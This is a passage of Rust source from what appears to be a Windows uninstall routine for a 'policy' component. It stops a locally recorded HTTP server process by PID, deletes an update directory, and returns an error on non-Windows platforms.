        if let Ok(s) = fs::read_to_string(&pid_file) {
            if let Ok(pid) = s.trim().parse::<u32>() {
                let _ = std::process::Command::new("taskkill")
                    .arg("/F").arg("/PID").arg(pid.to_string()).output();
                println!("[+] killed http server pid {}", pid);
            }
        }
    }
    if update_dir.exists() {
        fs::remove_dir_all(&update_dir)?;
        println!("[+] removed {}", update_dir.display());
    }
    Ok(())
}

#[cfg(not(windows))]
fn policy_uninstall(_: &str, _: bool) -> Result<()> {
    anyhow::bail!("policy uninstall only available on Windows")
}